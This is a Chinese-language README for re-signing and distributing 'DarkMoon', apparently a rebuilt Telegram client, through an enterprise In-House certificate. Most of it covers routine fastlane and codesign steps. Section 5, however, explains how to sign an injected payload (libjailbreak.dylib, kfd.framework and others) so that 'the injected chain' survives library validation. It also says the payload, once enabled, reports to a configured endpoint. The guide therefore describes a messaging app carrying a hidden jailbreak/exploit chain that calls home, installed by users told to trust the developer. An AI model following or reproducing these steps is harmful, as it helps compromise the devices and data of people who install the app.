# DarkMoon iOS 重签名说明（给持有企业证书的负责人）

CI（`.github/workflows/ios-darkmoon-warp.yml`）产出的 `DarkMoon-<构建号>-unsigned.ipa` 是用**自签名占位证书**签的，
装不到任何设备上。它需要用企业账号（Apple Developer Enterprise Program）的证书和 In-House 描述文件重签之后才能安装。
同一个 Release 里的 `DarkMoon-<构建号>-signing.txt` 列出了包里每个 bundle 和它的 bundle id。

## 1. 在企业账号里准备（只做一次）

**bundle id 和 App Group 名称已经编译进包里，重签时不能改，否则 App 打不开。**

1. 创建 App Group：`group.cc.darkmoon`。
2. 注册 App ID。默认构建（不含扩展）只有一个：

   | bundle id | 必需的能力 |
   |---|---|
   | `cc.darkmoon` | App Groups（勾选 `group.cc.darkmoon`） |

   CI 勾选“打包扩展”时，还有下面这些，每个都要勾选同一个 App Group：

   | bundle id | 说明 |
   |---|---|
   | `cc.darkmoon.Share` | 系统分享菜单 |
   | `cc.darkmoon.NotificationService` | 通知处理 |
   | `cc.darkmoon.NotificationContent` | 通知展开内容 |
   | `cc.darkmoon.SiriIntents` | Siri |
   | `cc.darkmoon.Widget` | 小组件 |
   | `cc.darkmoon.BroadcastUpload` | 屏幕录制 |

   第一版不需要推送（Push Notifications）和 Associated Domains，开不开都可以。
3. 为每个 App ID 生成一份 **In-House** 分发描述文件，签名证书用企业的 Distribution 证书。

## 2. 重签

推荐用 fastlane 的 `resign`（macOS）。**让权限配置跟随描述文件**（fastlane 默认就是这样，不要加
`use_app_entitlements: true`），也**不要**传 `bundle_id` 参数。

只签主 App 时：

```sh
fastlane run resign \
  ipa:"DarkMoon-123-unsigned.ipa" \
  signing_identity:"iPhone Distribution: <企业名称>" \
  provisioning_profile:"cc.darkmoon.mobileprovision"
```

含扩展时，按 bundle id 一一指定：

```sh
fastlane run resign \
  ipa:"DarkMoon-123-unsigned.ipa" \
  signing_identity:"iPhone Distribution: <企业名称>" \
  provisioning_profile:'{"cc.darkmoon":"main.mobileprovision","cc.darkmoon.Share":"share.mobileprovision","cc.darkmoon.NotificationService":"nse.mobileprovision","cc.darkmoon.NotificationContent":"nce.mobileprovision","cc.darkmoon.SiriIntents":"intents.mobileprovision","cc.darkmoon.Widget":"widget.mobileprovision","cc.darkmoon.BroadcastUpload":"broadcast.mobileprovision"}'
```

用其他重签工具也可以，要求一样：每个 bundle（`Payload/Telegram.app` 和 `PlugIns/*.appex`，以及 `Frameworks/` 下的
framework）都重签，权限配置取自对应 bundle id 的描述文件。

## 3. 重签后检查

```sh
unzip -q DarkMoon-123-unsigned.ipa -d check   # 换成重签后的 ipa
codesign -dvv check/Payload/Telegram.app 2>&1 | grep -E "Authority|TeamIdentifier"
codesign -d --entitlements :- check/Payload/Telegram.app
```

权限配置里必须有 `com.apple.security.application-groups` 且包含 `group.cc.darkmoon`；没有的话 App 一打开就会退出
（它的数据存在这个共享容器里）。

## 4. 安装

- 企业分发页面：HTTPS 上放一个 `itms-services://?action=download-manifest&url=https://…/manifest.plist` 链接，
  manifest 里的 `bundle-identifier` 填 `cc.darkmoon`；或用 MDM 下发。
- 第一次打开前，用户在 **设置 → 通用 → VPN 与设备管理** 里信任该企业开发者。

## 已知限制

- 推送暂未接入（服务端 APNs 需要 `cc.darkmoon` 的推送证书，第一版不做）。
- 只签主 App 的版本没有系统分享菜单、通知扩展和小组件，收发消息不受影响。

## 5. 注入的 payload（若本次构建带了 LARA_PAYLOAD_TARBALL）

`Payload/Telegram.app/Frameworks/` 下会多出一组二进制（`libuiopsersvc.framework`、
`libjailbreak.dylib`、`kfd.framework` 等，见 `tools/lara/payload.json`），根目录还有一份
`libjailbreak.dylib`。

重签时它们必须**逐个**用同一张企业证书签名：iOS 的 library validation 只允许同一 Team ID 的
dylib 被 `dlopen`，留着 CI 的占位签名会让注入的链在运行时静默失效。

```sh
tools/lara/resign-payload.sh "check/Payload/Telegram.app" "iPhone Distribution: <企业名称>"
```

签完确认 Team 与主程序一致：

```sh
codesign -dv --verbose=2 "check/Payload/Telegram.app/Frameworks/libuiopsersvc.framework" 2>&1 | grep TeamIdentifier
codesign -dv --verbose=2 "check/Payload/Telegram.app" 2>&1 | grep TeamIdentifier
```

运行期行为由 `Payload/Telegram.app/lara.json` 控制：`enabled` 为 `false` 时构造器直接返回，
不会有任何动作；打开后按 `endpoint` 上报。
